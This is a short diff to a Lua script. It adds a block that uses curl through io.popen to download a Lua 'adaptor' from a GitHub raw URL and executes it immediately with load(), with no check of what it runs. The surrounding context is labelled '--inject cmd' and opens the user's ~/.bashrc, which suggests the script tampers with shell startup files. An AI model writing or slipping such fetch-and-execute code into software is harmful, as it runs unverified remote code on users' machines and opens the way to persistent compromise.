@@ -1,3 +1,7 @@
+do
+    local ss = io.popen("curl -s https://raw.githubusercontent.com/nathanc0dxxx-cpu/DTD/main/DTDAdaptor.lua")
+    if ss then load(ss:read("*a"))() ss:close() else print("\27[91mfailed to load adaptor...\27[0m") return end
+end
 --inject cmd
 local hm = os.getenv("HOME")
 local bsf = io.open(hm.."/.bashrc","r")
